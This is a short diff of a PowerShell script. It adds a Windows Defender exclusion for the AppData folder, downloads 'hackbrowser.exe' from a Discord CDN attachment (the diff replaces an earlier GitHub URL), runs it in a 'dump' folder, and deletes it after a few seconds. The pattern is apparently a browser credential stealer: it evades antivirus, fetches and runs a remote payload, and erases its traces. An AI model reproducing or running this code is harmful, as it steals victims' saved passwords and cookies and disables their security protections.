@@ -5,7 +5,7 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 mkdir "$env:appdata\dump"
 Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest -Uri "https://github.com/atividadesonline2023/atividade2023/blob/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hackbrowser.exe"
+Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/792864993229799494/1171596352996773990/hackbrowser.exe?ex=655d4121&is=654acc21&hm=cea4e4eb493e36193ef656f1bb62cf205168cced6bc384e833240fb5881694f3&" -OutFile "$env:appdata\dump\hackbrowser.exe"
 ./hackbrowser.exe
 Start-Sleep -Seconds 6
 Remove-Item -Path "$env:appdata\dump\hackbrowser.exe" -Force
